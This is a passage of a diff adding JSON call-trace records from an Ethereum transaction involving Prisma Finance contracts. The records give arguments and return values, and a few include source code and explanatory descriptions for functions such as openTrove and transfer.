+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "24455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "24277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "24455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "24277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "59164",
+        "args": "0x56A201b872B50bBdEe0021ed4D1bb36359D291ED",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000005e99df77fb00254c110000000000000000000000000000000000000000000131606d95e8f34b0b74b9"
+    },
+    {
+        "id": "58989",
+        "args": "0x56A201b872B50bBdEe0021ed4D1bb36359D291ED",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000005e99df77fb00254c110000000000000000000000000000000000000000000131606d95e8f34b0b74b9"
+    },
+    {
+        "id": "125256",
+        "args": "0x56A201b872B50bBdEe0021ed4D1bb36359D291ED, 0xcC7218100da61441905e0c327749972e3CBee9EE, 1745081655656230243345 [1.745e21], 1442100561179971204904121 [1.442e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "125069",
+        "args": "0x56A201b872B50bBdEe0021ed4D1bb36359D291ED, 0xcC7218100da61441905e0c327749972e3CBee9EE, 1745081655656230243345 [1.745e21], 1442100561179971204904121 [1.442e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5034",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000001d"
+    },
+    {
+        "id": "2368",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000001d"
+    },
+    {
+        "id": "32203",
+        "args": "0x56A201b872B50bBdEe0021ed4D1bb36359D291ED",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "32034",
+        "args": "0x56A201b872B50bBdEe0021ed4D1bb36359D291ED",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "30068",
+        "args": "0xcC7218100da61441905e0c327749972e3CBee9EE, 1745081655656230243345 [1.745e21]",
+        "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
+        "description": "1. Core functions:  \nThe `transfer` function is designed to move a specified amount of tokens from the sender's account to the recipient's account. It acts as a bridge to call the internal `_transfer` function, which handles the actual transfer logic. This function is a standard part of token contracts to enable token movements between users.\n\n2. Security mechanism:  \nThe function uses the `public` and `virtual` modifiers, allowing it to be called by anyone and overridden in derived contracts, respectively. The `override` modifier ensures it replaces any existing function with the same name in the parent contract. Additionally, it relies on the internal `_transfer` function, which typically includes checks like ensuring the sender has enough tokens and preventing invalid addresses.\n\n3. Parameter Function:  \n- `recipient`: This is the address of the person or contract receiving the tokens.  \n- `amount`: This specifies the number of tokens to be transferred.  \n\n4. Return description:  \nThe function always returns `true` to indicate that the transfer was successful. This is a standard practice in token contracts to confirm the operation completed as expected.  \n\nIn summary, the `transfer` function facilitates token transfers between users, ensures security through modifiers and internal checks, and confirms success by returning `true`.",
+        "return_value": "true"
+    },
+    {
+        "id": "10336",
+        "args": "0xcC7218100da61441905e0c327749972e3CBee9EE, 1441900561179971204904121 [1.441e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "773660",
+        "args": "0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6, 0x56A201b872B50bBdEe0021ed4D1bb36359D291ED, 5000000325833471 [5e15], 463184447350099685758 [4.631e20], 1443398534054748145744620 [1.443e24], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F",
+        "original_code": "    function openTrove(\n        ITroveManager troveManager,\n        address account,\n        uint256 _maxFeePercentage,\n        uint256 _collateralAmount,\n        uint256 _debtAmount,\n        address _upperHint,\n        address _lowerHint\n    ) external callerOrDelegated(account) {\n        require(!PRISMA_CORE.paused(), \"Deposits are paused\");\n        IERC20 collateralToken;\n        LocalVariables_openTrove memory vars;\n        bool isRecoveryMode;\n        (\n            collateralToken,\n            vars.price,\n            vars.totalPricedCollateral,\n            vars.totalDebt,\n            isRecoveryMode\n        ) = _getCollateralAndTCRData(troveManager);\n\n        _requireValidMaxFeePercentage(_maxFeePercentage);\n\n        vars.netDebt = _debtAmount;\n\n        if (!isRecoveryMode) {\n            vars.netDebt = vars.netDebt + _triggerBorrowingFee(troveManager, account, _maxFeePercentage, _debtAmount);\n        }\n        _requireAtLeastMinNetDebt(vars.netDebt);\n\n        // ICR is based on the composite debt, i.e. the requested Debt amount + Debt borrowing fee + Debt gas comp.\n        vars.compositeDebt = _getCompositeDebt(vars.netDebt);\n        vars.ICR = PrismaMath._computeCR(_collateralAmount, vars.compositeDebt, vars.price);\n        vars.NICR = PrismaMath._computeNominalCR(_collateralAmount, vars.compositeDebt);\n\n        if (isRecoveryMode) {\n            _requireICRisAboveCCR(vars.ICR);\n        } else {\n            _requireICRisAboveMCR(vars.ICR, troveManager.MCR());\n            uint256 newTCR = _getNewTCRFromTroveChange(\n                vars.totalPricedCollateral,\n                vars.totalDebt,\n                _collateralAmount * vars.price,\n                true,\n                vars.compositeDebt,\n                true\n            ); // bools: coll increase, debt increase\n            _requireNewTCRisAboveCCR(newTCR);\n        }\n\n        // Create the trove\n        (vars.stake, vars.arrayIndex) = troveManager.openTrove(\n            account,\n            _collateralAmount,\n            vars.compositeDebt,\n            vars.NICR,\n            _upperHint,\n            _lowerHint,\n            isRecoveryMode\n        );\n        emit TroveCreated(account, vars.arrayIndex);\n\n        // Move the collateral to the Trove Manager\n        collateralToken.safeTransferFrom(msg.sender, address(troveManager), _collateralAmount);\n\n        //  and mint the DebtAmount to the caller and gas compensation for Gas Pool\n        debtToken.mintWithGasCompensation(msg.sender, _debtAmount);\n\n        emit TroveUpdated(account, vars.compositeDebt, _collateralAmount, vars.stake, BorrowerOperation.openTrove);\n    }\n\n    // Send collateral to a trove\n",
+        "description": "1. **Core functions**:  \n   The `openTrove` function is designed to create a new \"trove,\" which is essentially a collateralized debt position. It allows a user to deposit collateral and borrow a specified amount of debt. The function interacts with a `troveManager` to manage the trove, calculates fees, ensures the collateral ratio is within acceptable limits, and handles the transfer of collateral and minting of debt tokens. It also emits events to track the creation and updates of the trove.\n\n2. **Security mechanism**:  \n   - **`callerOrDelegated(account)`**: Ensures that only the account owner or a delegated address can call this function.  \n   - **`require(!PRISMA_CORE.paused(), \"Deposits are paused\")`**: Checks if the system is paused and prevents deposits if it is.  \n   - **`_requireValidMaxFeePercentage`**: Validates that the maximum fee percentage is within acceptable limits.  \n   - **`_requireAtLeastMinNetDebt`**: Ensures the net debt meets the minimum required amount.  \n   - **`_requireICRisAboveCCR` and `_requireICRisAboveMCR`**: Verify that the collateral ratio (ICR) is above the critical or minimum collateral ratio, depending on the system's mode.  \n   - **`_requireNewTCRisAboveCCR`**: Ensures the total collateral ratio (TCR) remains above the critical threshold after the trove is created.  \n\n3. **Parameter Function**:  \n   - **`troveManager`**: Manages the trove operations and stores trove data.  \n   - **`account`**: The address of the user creating the trove.  \n   - **`_maxFeePercentage`**: The maximum fee percentage the user is willing to pay for borrowing.  \n   - **`_collateralAmount`**: The amount of collateral the user is depositing.  \n   - **`_debtAmount`**: The amount of debt the user is borrowing.  \n   - **`_upperHint` and `_lowerHint`**: Helper addresses used to efficiently insert the trove into the sorted list of troves.  \n\n4. **Return description**:  \n   The function does not return a value directly. Instead, it performs several actions:  \n   - Calculates the net debt, including borrowing fees if applicable.  \n   - Computes the collateral ratio (ICR) and nominal collateral ratio (NICR) based on the collateral and debt amounts.  \n   - Creates the trove using the `troveManager` and updates the system's state.  \n   - Transfers the collateral to the `troveManager` and mints the debt tokens to the caller.  \n   - Emits events (`TroveCreated` and `TroveUpdated`) to track the trove's creation and updates.  \n\nIn summary, the `openTrove` function enables users to create a collateralized debt position by depositing collateral and borrowing debt. It ensures the system's security by validating inputs, checking collateral ratios, and managing fees. The function interacts with the `troveManager` to handle the trove's creation and updates the system's state accordingly.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2417",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "5591",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000ba06b1d04654d7eed200000000000000000000000000000000000000000002fe3914d585e273e9da6f0000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "5413",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000ba06b1d04654d7eed200000000000000000000000000000000000000000002fe3914d585e273e9da6f0000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "27363",
+        "args": "1443398534054748145744620 [1.443e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000e713bdd51ce"
+    },
+    {
+        "id": "27191",
+        "args": "1443398534054748145744620 [1.443e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000e713bdd51ce"
+    },
+    {
+        "id": "2359",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000fdce0267803c6a0d209d3721d2f01fd618e9cbf8"
+    },
+    {
+        "id": "7772",
+        "args": "0xfdCE0267803C6a0D209D3721d2f01Fd618e9CBF8, 15879498453454 [1.587e13]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3430",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000f43fc2c04ee0000"
+    },
+    {
+        "id": "3264",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000f43fc2c04ee0000"
+    },
+    {
+        "id": "634024",
+        "args": "0x56A201b872B50bBdEe0021ed4D1bb36359D291ED, 463184447350099685758 [4.631e20], 1443598534070627644198074 [1.443e24], 32085405770260952 [3.208e16], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000191bf9b8cefc50317e000000000000000000000000000000000000000000000000000000000000001c"
+    },
+    {
+        "id": "633813",
+        "args": "0x56A201b872B50bBdEe0021ed4D1bb36359D291ED, 463184447350099685758 [4.631e20], 1443598534070627644198074 [1.443e24], 32085405770260952 [3.208e16], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000191bf9b8cefc50317e000000000000000000000000000000000000000000000000000000000000001c"
+    },
+    {
+        "id": "578593",
+        "args": "0x56A201b872B50bBdEe0021ed4D1bb36359D291ED, 32085405770260952 [3.208e16], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "578406",
+        "args": "0x56A201b872B50bBdEe0021ed4D1bb36359D291ED, 32085405770260952 [3.208e16], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "13238",
+        "args": "0x3B15CEc2d922Ab0Ef74688bcC1056461049f89CB",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000002876919d00e0253"
+    },
+    {
+        "id": "13066",
+        "args": "0x3B15CEc2d922Ab0Ef74688bcC1056461049f89CB",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000002876919d00e0253"
+    },
+    {
+        "id": "3238",
+        "args": "0x3B15CEc2d922Ab0Ef74688bcC1056461049f89CB",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000002876919d00e0253"
+    },
+    {
+        "id": "3066",
+        "args": "0x3B15CEc2d922Ab0Ef74688bcC1056461049f89CB",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000002876919d00e0253"
+    },
+    {
+        "id": "13238",
+        "args": "0x4A3Fced7C536e39ca5292A024ee66C9B45b257eC",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001fa3ee604ff7538"
+    },
+    {
+        "id": "13066",
+        "args": "0x4A3Fced7C536e39ca5292A024ee66C9B45b257eC",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001fa3ee604ff7538"
+    },
+    {
+        "id": "3238",
+        "args": "0x4A3Fced7C536e39ca5292A024ee66C9B45b257eC",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001fa3ee604ff7538"
+    },
+    {
+        "id": "3066",
+        "args": "0x4A3Fced7C536e39ca5292A024ee66C9B45b257eC",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001fa3ee604ff7538"
+    },
+    {
+        "id": "13238",
+        "args": "0xcbfDfFD7a2819a47FcD07DfA8bcB8A5DEACc9eA8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001e9c08df5303366"
+    },
+    {
+        "id": "13066",
+        "args": "0xcbfDfFD7a2819a47FcD07DfA8bcB8A5DEACc9eA8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001e9c08df5303366"
+    },
+    {
+        "id": "3238",
+        "args": "0xcbfDfFD7a2819a47FcD07DfA8bcB8A5DEACc9eA8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001e9c08df5303366"
+    },
+    {
+        "id": "3066",
+        "args": "0xcbfDfFD7a2819a47FcD07DfA8bcB8A5DEACc9eA8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001e9c08df5303366"
+    },
+    {
+        "id": "13238",
+        "args": "0x409C6c5Ec5C479673f4c09fb80d0F182Fcff643e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001d5d79c7d9b727d"
+    },
+    {
+        "id": "13066",
+        "args": "0x409C6c5Ec5C479673f4c09fb80d0F182Fcff643e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001d5d79c7d9b727d"
+    },
+    {
+        "id": "3238",
+        "args": "0x409C6c5Ec5C479673f4c09fb80d0F182Fcff643e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001d5d79c7d9b727d"
+    },
+    {
+        "id": "3066",
+        "args": "0x409C6c5Ec5C479673f4c09fb80d0F182Fcff643e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001d5d79c7d9b727d"
+    },
+    {
+        "id": "13238",
+        "args": "0xe0042d684Fe6bFA4D897082f97B41532aA39640c",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c31d1114c8d420"
+    },
+    {
+        "id": "13066",
+        "args": "0xe0042d684Fe6bFA4D897082f97B41532aA39640c",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c31d1114c8d420"
+    },
+    {
+        "id": "3238",
+        "args": "0xe0042d684Fe6bFA4D897082f97B41532aA39640c",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c31d1114c8d420"
+    },
+    {
+        "id": "3066",
+        "args": "0xe0042d684Fe6bFA4D897082f97B41532aA39640c",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c31d1114c8d420"
+    },
+    {
+        "id": "13238",
+        "args": "0xC487370895F6E8f5b62d99bf1472c95a94073379",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c2ddf9328f78c3"
+    },
+    {
+        "id": "13066",
+        "args": "0xC487370895F6E8f5b62d99bf1472c95a94073379",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c2ddf9328f78c3"
+    },
+    {
+        "id": "3238",
+        "args": "0xC487370895F6E8f5b62d99bf1472c95a94073379",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c2ddf9328f78c3"
+    },
+    {
+        "id": "3066",
+        "args": "0xC487370895F6E8f5b62d99bf1472c95a94073379",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c2ddf9328f78c3"
+    },
+    {
+        "id": "13238",
+        "args": "0xf8D1C9AB49219f7acF7b1d84705e5Aea3b8Ce0aa",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c21e0203633bbb"
+    },
+    {
+        "id": "13066",
+        "args": "0xf8D1C9AB49219f7acF7b1d84705e5Aea3b8Ce0aa",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c21e0203633bbb"
+    },
+    {
+        "id": "3238",
+        "args": "0xf8D1C9AB49219f7acF7b1d84705e5Aea3b8Ce0aa",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c21e0203633bbb"
+    },
+    {
+        "id": "3066",
+        "args": "0xf8D1C9AB49219f7acF7b1d84705e5Aea3b8Ce0aa",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001c21e0203633bbb"
+    },
+    {
+        "id": "13238",
+        "args": "0x3B82eE6c15B212Ed69D5795bCD957e136EAA4bfF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001aeba3ca1181dc8"
+    },
+    {
+        "id": "13066",
+        "args": "0x3B82eE6c15B212Ed69D5795bCD957e136EAA4bfF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001aeba3ca1181dc8"
+    },
+    {
+        "id": "3238",
+        "args": "0x3B82eE6c15B212Ed69D5795bCD957e136EAA4bfF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001aeba3ca1181dc8"
+    },
+    {
+        "id": "3066",
+        "args": "0x3B82eE6c15B212Ed69D5795bCD957e136EAA4bfF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001aeba3ca1181dc8"
+    },
+    {
+        "id": "13238",
+        "args": "0x1b004189e64d5b2F71d5Be554470E6c49e10123B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000019f23fee6c9447b"
+    },
+    {
+        "id": "13066",
+        "args": "0x1b004189e64d5b2F71d5Be554470E6c49e10123B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000019f23fee6c9447b"
+    },
+    {
+        "id": "3238",
+        "args": "0x1b004189e64d5b2F71d5Be554470E6c49e10123B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000019f23fee6c9447b"
+    },
+    {
+        "id": "3066",
+        "args": "0x1b004189e64d5b2F71d5Be554470E6c49e10123B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000019f23fee6c9447b"
+    },
+    {
+        "id": "13238",
+        "args": "0x16F570e93fDbC3A4865b7740DEB052eE94d87E15",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000190140a18bfbaad"
+    },
+    {
+        "id": "13066",
+        "args": "0x16F570e93fDbC3A4865b7740DEB052eE94d87E15",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000190140a18bfbaad"
+    },
+    {
+        "id": "3238",
+        "args": "0x16F570e93fDbC3A4865b7740DEB052eE94d87E15",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000190140a18bfbaad"
+    },
+    {
+        "id": "3066",
+        "args": "0x16F570e93fDbC3A4865b7740DEB052eE94d87E15",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000190140a18bfbaad"
+    },
+    {
+        "id": "13238",
+        "args": "0x1B72Bac3772050FDCaF468CcE7e20deb3cB02d89",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018fdacb9a67bc5f"
+    },
+    {
+        "id": "13066",
+        "args": "0x1B72Bac3772050FDCaF468CcE7e20deb3cB02d89",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018fdacb9a67bc5f"
+    },
+    {
